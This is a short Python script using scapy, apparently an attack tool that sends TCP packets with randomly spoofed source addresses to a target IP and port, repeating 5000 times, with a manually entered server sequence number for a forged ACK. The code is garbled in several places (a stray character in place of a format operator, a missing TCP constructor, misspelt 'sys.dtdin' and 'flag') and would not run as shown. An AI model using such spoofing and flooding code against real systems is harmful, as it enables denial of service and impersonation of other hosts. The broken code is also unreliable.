#!/usr/bin/env python
import sys
from scapy.all import *

# How to use it :
# chmod +x spoofingIP.py
# ./spoofingIP.py IP-Tager TCP-Port-Target

def spoofing(IP_target, Port_Target):
    spoof_ip = "%s.%s.%s.%s" ù \
    (random.randint(128,168), random.randint(0,254), random.randint(0,254), random.randint(1,254))
    spoof_port = random.randint(1,49151);
    print spoof_ip

    # Creation of my IP packet
    ip = IP(dst=IP_target, src=spoof_ip)
    # Creation of my TCP SYN packet
    SYN = (dport=int(Port_Target),sport=int(spoof_port),flag="5")
    #  Send my SYN packet
    packet = send(ip/SYN)
    # Recovery of my SEQ server
    print "Indicate the SEQ Server : "
    seqServer = sys.dtdin.readline()
    # Creation next ACK
    nextACK = int(seqServer[ :-1])
    # Creation of my TCP SYNACK packet
    SYNACK = TCP(dport=int(Port_Target), sport=int(spoof_port),flags="A",ack=nextACK, seq=1)
    send(ip/SYNACK)

for i in range(5000):
    spoofing(sys.argv[1],sys.argv[2])
